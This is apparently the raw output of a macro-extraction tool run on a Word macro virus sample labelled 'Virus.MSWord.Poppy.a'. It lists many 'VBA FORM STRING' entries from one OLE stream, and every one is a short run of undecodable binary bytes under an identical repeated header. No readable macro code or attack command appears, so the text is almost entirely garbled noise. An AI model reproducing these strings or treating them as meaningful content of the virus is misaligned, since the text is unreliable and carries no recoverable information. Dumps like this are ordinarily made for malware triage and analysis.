VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!��.57
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c��l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<0�z'�'#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j������S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+i��h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����[�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~L`�同g����c�^+�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$��Y%-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŋ�C"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R>����Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�!��(҂
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
])u�9]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�?� �B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OEQ.CɰJ�-}�U�y�-Ն�@&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����� b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Ƕ���;�i����I-<Ue
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~Zld���=KS5%)J��,s\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e��|��eX�5XP7`6�~P~n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hu�i�W'���D���t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�BȐ�0K�+�Q��e}>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mgi@C��q��ъ�bTu�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8`S�1�yϯ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��Z5j��9#p������	�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2G_26Ҁ�P9Ƿ=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"H�+�힜�M��yP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͼ�TH�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�?�T��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n}9��<����&��b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>T!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{g�CS]6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�#8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���΢�f��:b͠���o�Y�ڞ(�vjzY�CT<�euDH��%W��=C?��c�ˍU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�_�[(򆑮���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�����j�2:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�����׏��tL�$�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ܨ��=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�=*�
�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�����B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��7�W�" ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99'����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{|��5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B���G�rs�1��-�h)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F
+ʤ�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'������X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A#p��Շۑҍ��u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\�Kl4oU���R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Oj[oe*�Ix��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������i��r�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�Y)�`t����Y֠��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������;KSQ�
q$jL��%ǹ9>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��TP]*T�,��͸�襊�a�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c+��s��G��ymN�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˶p?�g>�/=4��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@�P��E�K\��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ԫ�|m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܤ�f�Ð>�uj�6R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ��Ir�\��z:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}Ƶ���
���)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;cʢ�C(j�4t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�F���EY���L[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HG��}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E"���K�`�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q���q)���iͮe�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$�����"(�i"c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� m���F3C(�c�P���4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d����z*Y6�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��)Cl��R"���-�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?^03�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�.�_wK�^���^�-5M�JMFmR�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`F�#@ܠP���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IkuME6?y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�~�^D�J�a���C&4�7�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s(?\�tZ�1#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v;� z���sx��N{�;�{�`.6��I����-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�ƪ���e���*�템�"bb͝'g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�벰^2�:�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u>��3�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[萼�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r���pq�Fq��s���ŧՑ���tU/�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?Tǫ��ߪ��%o�Ui�SS�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+f���ue�A�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����q�59��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XV9.&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u*�+̥
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V_RB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z3C����>;�d�t�G�;z�*7b�]�h�+]�Hr��NN0X�>���j�ӮU���N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�(���b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�c�ݢ��_�ì'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�b�O׌`���ӧ�zXɤh��h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��\�c���(�{F����R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w|��@n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�ߥ�Maz�\hi����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���KU�֡�ǵ�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�Y���k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EX��T�W��˟���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dh�ܗ?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C�'S�KQm{�H��A��j��TǨ
�6�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zt��uܺKw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8#V�����dx�6m��l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d��Z��'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�Cg�?���4T�N)�}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���=Uu�i*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Zv�(&l��	<���=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�w�rH���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r��u=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I��)�Xآ��k��A;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޻YJ�YҞ��6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�0�D���m�Q�⅌
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Iܧ>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I\���sѺ�Db
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����cWO0Fp3�
-------------------------------------------------------------------------------
